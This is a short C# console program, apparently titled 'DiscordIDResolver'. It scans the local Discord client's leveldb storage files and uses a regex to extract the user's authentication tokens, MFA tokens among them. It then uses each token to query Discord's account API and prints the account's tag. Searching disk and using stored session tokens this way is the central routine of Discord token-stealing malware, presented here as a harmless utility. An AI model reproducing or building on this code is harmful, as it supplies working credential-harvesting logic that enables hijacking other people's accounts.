using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace DiscordIDResolver
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            Console.WriteLine(GetDiscordUserInfo().Tag);
            Console.ReadLine();
        }

        private static DiscordModel GetDiscordUserInfo()
        {
            try
            {
                var path = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\discord\\Local Storage\\leveldb\\";

                if (!Directory.Exists(path)) return null;

                var ldb = Directory.GetFiles(path, "*.ldb");

                foreach (var ldbFile in ldb)
                {
                    var text = File.ReadAllText(ldbFile);

                    const string tokenReg = @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";

                    var token = Regex.Match(text, tokenReg);

                    if (!token.Success) continue;

                    var http = new WebClient();
                    http.Headers.Add("Authorization", token.Value);

                    var url = "https://discord.com/api/v6/users/@me";
                    var result = http.DownloadString(url);

                    if (result.Contains("Unauthorized")) continue;

                    var finalResult = JsonConvert.DeserializeObject<JToken>(result);

                    return new DiscordModel
                    {
                        ID = finalResult["id"]?.ToString(),
                        Username = finalResult["username"]?.ToString(),
                        Tag = Convert.ToInt32(finalResult["discriminator"]?.ToString())
                    };
                }

                return null;
            }
            catch
            {
                return null;
            }
        }


        internal class DiscordModel
        {
            internal string ID { get; set; }
            internal string Username { get; set; }
            internal int Tag { get; set; }
        }
    }
}
